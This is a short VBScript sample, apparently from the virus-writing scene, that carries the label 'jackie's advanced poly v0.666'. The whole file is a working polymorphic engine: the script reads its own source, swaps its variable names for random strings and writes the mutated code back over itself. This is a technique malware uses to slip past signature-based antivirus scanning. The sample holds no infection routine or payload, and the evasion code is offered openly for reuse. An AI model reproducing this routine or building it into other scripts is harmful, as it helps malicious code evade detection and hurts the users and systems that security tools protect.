randomize
set fsobject=createobject("scripting.filesystemobject")
set scriptfile=fsobject.opentextfile(wscript.scriptfullname,1)
jc=scriptfile.readall
jav="jap jc jav jsp jv jlo jnv fsobject scriptfile":jsp=split(jav," ")
for each jv in jsp
for jlo=1 to int(rnd*6)+2:jnv=jnv&chr((int(rnd*22)+97))&int(rnd*9):next
jc=replace(jc,jv,jnv):jnv=""
next
set scriptfile=fsobject.opentextfile(wscript.scriptfullname,2,1)
scriptfile.writeline jc
scriptfile.close

' jackie's advanced poly v0.666 // vbs sample